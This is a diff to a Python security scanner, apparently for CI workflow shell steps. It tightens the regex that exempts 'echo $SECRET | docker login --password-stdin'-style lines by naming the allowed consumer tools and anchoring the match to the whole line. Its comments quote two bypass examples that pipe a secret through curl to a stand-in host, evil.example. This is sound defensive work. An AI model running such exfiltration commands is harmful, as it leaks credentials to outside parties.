@@ -797,9 +797,32 @@ def _strip_bash_full_line_comments(body: str) -> str:
     )
 
 
+# Known stdin-credential consumers for the ``--password-stdin``
+# exemption.  The exemption must NAME the consumer: the earlier
+# ``| <anything> ... --password-stdin`` shape was attacker-
+# satisfiable — ``echo "$SECRET" | sh -c 'curl -d @- https://evil.
+# example' --password-stdin`` exfiltrates (sh -c ignores trailing
+# args as $0) yet matched, suppressing the run_block finding.
+_STDIN_CONSUMERS = (
+    r"(?:docker|podman|buildah|nerdctl|skopeo|oras|crane|helm|regctl)"
+)
 _STDIN_PIPE_RE = re.compile(
-    r"""echo\s+["']?\$(?:\{\{[^}]*secrets\.[^}]*\}\}|"""
-    r"""[A-Z_]+)["']?\s*\|\s*\S+.*--password-stdin""",
+    # Anchored to the WHOLE stripped line: the exemption applies to
+    # the exact single-command shape only.  An unanchored search let
+    # anything ride shotgun on the same line — ``… --password-stdin
+    # && echo "$TOKEN" | curl -d @- https://evil.example`` exempted
+    # the exfil because the line CONTAINED a matching prefix.
+    r"""^echo\s+["']?\$(?:\{\{[^}]*secrets\.[^}]*\}\}|"""
+    r"""[A-Z_]+)["']?\s*\|\s*"""
+    + _STDIN_CONSUMERS
+    # Subcommand chain ending in ``login`` (``login`` / ``auth
+    # login`` / ``registry login``), then only plain arguments
+    # BEFORE AND AFTER the flag, to end of line: no pipes,
+    # separators, redirects, backticks or ``$(`` command
+    # substitution may appear anywhere in the exempted token stream
+    # (plain ``$VAR`` / ``${{ ... }}`` expansions are fine).
+    + r"""\s+(?:[\w.-]+\s+)*login\s+(?:\$(?!\()|[^|;&<>$`])*"""
+    + r"""--password-stdin(?:\$(?!\()|[^|;&<>$`])*$""",
 )
 
 
